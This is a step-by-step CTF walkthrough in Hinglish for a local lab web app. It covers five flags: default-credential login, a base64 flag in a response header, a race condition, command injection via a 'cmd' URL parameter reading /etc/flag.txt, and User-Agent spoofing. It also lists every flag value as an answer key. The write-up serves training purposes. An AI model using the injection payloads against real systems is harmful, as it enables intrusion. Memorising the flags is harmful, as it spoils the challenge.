# CTF 2025 - विस्तृत चरणबद्ध गाइड (Detailed Step-by-Step Guide)

## 🚩 परिचय (Introduction)
Ye CTF application mein 5 flags chupe hue hain. Har flag ke liye alag technique use karni padegi. Mein aapko step-by-step detail mein bataunga ki kaise har flag dhundna hai.

**Base URL:** `http://192.168.29.153:5000/`

---

## 🔧 सेटअप (Setup)

### Step 1: Application Start Karna
```bash
# पहले dependencies install करें
pip install -r requirements.txt

# Application चलाएं
python3 app.py
```

### Step 2: Browser Mein Website Kholna
- Browser mein jao: `http://192.168.29.153:5000/`
- Aapko main page dikhega jahan sare endpoints listed hain

---

## 🚩 Flag 1: Authentication Bypass - `TCQ2025{S3Cur1ty_Br3@k_P@55ed}`

### Method: Weak Password Attack

#### Step-by-Step Process:

**Step 1:** Login page par jao
```
http://192.168.29.153:5000/login
```

**Step 2:** Default credentials try karo
- Username: `admin`
- Password: `password123`

**Step 3:** Agar nahi pata, to HTML source code check karo
- Browser mein Right Click → View Page Source
- Comments mein hint milega: `<!-- HTML Comment hint: admin:password123 -->`

**Step 4:** Login form submit karo
- Username field mein `admin` type karo
- Password field mein `password123` type karo
- Login button press karo

**Step 5:** Success!
- Dashboard page par redirect ho jaoge
- Wahan flag display hoga: `TCQ2025{S3Cur1ty_Br3@k_P@55ed}`

#### Alternative Methods:
- Burp Suite se login request intercept kar sakte ho
- Common credential wordlist use kar sakte ho

---

## 🚩 Flag 2: Header Analysis - `TCQ2025{F!ow3r#92@tY8&Vk}`

### Method: HTTP Response Headers Analysis

#### Step-by-Step Process:

**Step 1:** API endpoint par jao
```
http://192.168.29.153:5000/api/flower
```

**Step 2:** Response headers check karo

**Method A: Browser Developer Tools**
- F12 press karo
- Network tab open karo
- Page refresh karo
- `/api/flower` request par click karo
- Response Headers section mein jao
- `X-Flower-Token` header dhundo

**Method B: curl command**
```bash
# Headers ke saath response dekho
curl -I http://192.168.29.153:5000/api/flower

# Ya full response with headers
curl -v http://192.168.29.153:5000/api/flower
```

**Step 3:** Base64 decode karo
- Header value: `VENRMjAyNXtGIW93M3IjOTJAdFk4JlZrfQ==`
- Online base64 decoder use karo ya command:
```bash
echo "VENRMjAyNXtGIW93M3IjOTJAdFk4JlZrfQ==" | base64 -d
```

**Step 4:** Flag milega!
- Decoded value: `TCQ2025{F!ow3r#92@tY8&Vk}`

#### Tools Needed:
- Browser Developer Tools
- curl command
- Base64 decoder

---

## 🚩 Flag 3: Race Condition - `TCQ2025{Y0u_kn0w_i5_th15_RaC3}`

### Method: Timing Attack with Rapid Requests

#### Step-by-Step Process:

**Step 1:** Race endpoint ko understand karo
```
http://192.168.29.153:5000/race
```

**Step 2:** Single request test karo
```bash
curl http://192.168.29.153:5000/race
```
- Response mein counter aur message dikhega

**Step 3:** Rapid requests bhejo (Manual Method)
Browser mein:
- Race endpoint ko multiple tabs mein jaldi-jaldi refresh karo
- Ya F5 button repeatedly press karo

**Step 4:** Script use karo (Recommended)**

**Bash Script:**
```bash
# Terminal mein ye commands run karo
for i in {1..10}; do
    curl -s http://192.168.29.153:5000/race | grep -o "TCQ2025{[^}]*}" 2>/dev/null
    sleep 0.1
done
```

**Python Script:**
```python
import requests
import time

url = "http://192.168.29.153:5000/race"
for i in range(10):
    response = requests.get(url)
    data = response.json()
    if 'flag' in data:
        print(f"FLAG FOUND: {data['flag']}")
        break
    print(f"Request {i+1}: Counter = {data['counter']}")
    time.sleep(0.1)
```

**Step 5:** Flag detection
- Jab counter 3-5 ke beech hoga, tab flag milega
- Response mein `"flag": "TCQ2025{Y0u_kn0w_i5_th15_RaC3}"` dikhega

#### Important Notes:
- 3rd se 5th request ke beech window hai
- Timing important hai, bahut fast ya slow nahi hona chahiye

---

## 🚩 Flag 4: Command Injection - `TCQ2025{PwN_2_0wN_N0w_Y0u_ar3_5t3M}`

### Method: Parameter Manipulation

#### Step-by-Step Process:

**Step 1:** System endpoint check karo
```
http://192.168.29.153:5000/system
```

**Step 2:** Available commands test karo
```
http://192.168.29.153:5000/system?cmd=ls
http://192.168.29.153:5000/system?cmd=whoami
```

**Step 3:** File access try karo
- Hint page mein likha hai: `cat /etc/flag.txt (try this one!)`
- URL mein parameter add karo:
```
http://192.168.29.153:5000/system?cmd=cat /etc/flag.txt
```

**Step 4:** URL encode karo (if needed)
```
http://192.168.29.153:5000/system?cmd=cat%20/etc/flag.txt
```

**curl command:**
```bash
curl "http://192.168.29.153:5000/system?cmd=cat%20/etc/flag.txt"
```

**Step 5:** Flag output
- Response mein flag display hoga:
```
System output:
TCQ2025{PwN_2_0wN_N0w_Y0u_ar3_5t3M}
```

#### Security Learning:
- Command injection vulnerability demonstration
- Always sanitize user input
- Never trust user-provided parameters

---

## 🚩 Flag 5: User-Agent Spoofing - `TCQ2025{D4Y_0_T0_zeR0_d4Y}`

### Method: Custom HTTP Headers

#### Step-by-Step Process:

**Step 1:** Vulnerability endpoint test karo
```bash
# Normal request
curl http://192.168.29.153:5000/vulnerability
```
- Response: `"scanner": "unknown"`

**Step 2:** Hint check karo
- Page source mein hint hai: `Try: CTF-Scanner-2025`
- Custom User-Agent header chahiye

**Step 3:** Custom User-Agent bhejo

**curl method:**
```bash
curl -H "User-Agent: CTF-Scanner-2025" http://192.168.29.153:5000/vulnerability
```

**Browser method:**
- Browser Developer Tools (F12) open karo
- Console tab mein jao
- Ye JavaScript code run karo:
```javascript
fetch('/vulnerability', {
    headers: {
        'User-Agent': 'CTF-Scanner-2025'
    }
}).then(response => response.json()).then(data => console.log(data));
```

**Burp Suite method:**
- Request intercept karo
- User-Agent header modify karo: `CTF-Scanner-2025`
- Forward request

**Step 4:** Success response
```json
{
    "vulnerability": "detected",
    "type": "zero-day", 
    "flag": "TCQ2025{D4Y_0_T0_zeR0_d4Y}",
    "message": "Vulnerability scanner detected the zero-day exploit!"
}
```

#### Python Script:
```python
import requests

url = "http://192.168.29.153:5000/vulnerability"
headers = {"User-Agent": "CTF-Scanner-2025"}
response = requests.get(url, headers=headers)
print(response.json())
```

---

## 🎯 Summary - सभी Flags

| Flag | Value | Method | Endpoint |
|------|-------|--------|----------|
| Flag 1 | `TCQ2025{S3Cur1ty_Br3@k_P@55ed}` | Weak Credentials | `/login` |
| Flag 2 | `TCQ2025{F!ow3r#92@tY8&Vk}` | Header Analysis | `/api/flower` |
| Flag 3 | `TCQ2025{Y0u_kn0w_i5_th15_RaC3}` | Race Condition | `/race` |
| Flag 4 | `TCQ2025{PwN_2_0wN_N0w_Y0u_ar3_5t3M}` | Command Injection | `/system` |
| Flag 5 | `TCQ2025{D4Y_0_T0_zeR0_d4Y}` | User-Agent Spoofing | `/vulnerability` |

---

## 🛠️ Tools Ki List

### Browser Tools:
- **Developer Tools (F12)** - Headers, network analysis ke liye
- **View Source** - HTML comments check karne ke liye
- **Console** - JavaScript commands run karne ke liye

### Command Line Tools:
- **curl** - HTTP requests bhejne ke liye
- **base64** - Encoding/decoding ke liye
- **grep** - Output filtering ke liye

### Optional Advanced Tools:
- **Burp Suite** - Professional web testing
- **Postman** - API testing
- **Python requests** - Automation scripting

---

## 💡 Extra Tips

### General Reconnaissance:
1. **robots.txt check karo:**
   ```
   http://192.168.29.153:5000/robots.txt
   ```

2. **Source code mein comments dhundo:**
   - Right click → View Page Source
   - Ctrl+F se "flag" search karo

3. **Browser console messages check karo:**
   - F12 → Console tab
   - Helpful hints milte hain

### Common CTF Techniques:
- **Directory enumeration** - Hidden paths dhundna
- **Parameter fuzzing** - Different inputs try karna  
- **Header manipulation** - Custom headers bhejna
- **Timing attacks** - Response time analysis
- **Source code analysis** - Comments aur hidden content

### Security Best Practices (Jo seekhna chahiye):
- Never use default passwords
- Always validate user input
- Don't trust client-side headers
- Implement proper rate limiting
- Sanitize all user-controlled data

---

## 🔍 Troubleshooting

### Agar flag nahi mil raha:

**Flag 1 issues:**
- Check case sensitivity: `admin` (lowercase)
- Password exactly: `password123`
- Clear browser cache

**Flag 2 issues:**
- Headers properly check karo
- Base64 properly decode karo
- Network tab mein response headers dekho

**Flag 3 issues:**
- Timing important hai - too fast ya too slow nahi
- Multiple requests quickly bhejo
- Script use karo manual se better hai

**Flag 4 issues:**
- URL encoding properly karo
- Space characters ko %20 se replace karo
- Full command path try karo

**Flag 5 issues:**
- User-Agent exactly match karna chahiye: `CTF-Scanner-2025`
- Headers properly set karo
- Case sensitive hai

---

## 📞 Help Commands

**Quick test all flags:**
```bash
# Flag 1
curl -X POST -d "username=admin&password=password123" http://192.168.29.153:5000/login

# Flag 2  
curl -I http://192.168.29.153:5000/api/flower | grep X-Flower-Token

# Flag 3
for i in {1..6}; do curl -s http://192.168.29.153:5000/race | jq -r '.flag // empty'; done

# Flag 4
curl "http://192.168.29.153:5000/system?cmd=cat%20/etc/flag.txt"

# Flag 5
curl -H "User-Agent: CTF-Scanner-2025" http://192.168.29.153:5000/vulnerability
```

Ye complete guide hai! Agar koi specific step mein problem aaye to mujhse puch sakte ho.

**Happy Flag Hunting! 🚩**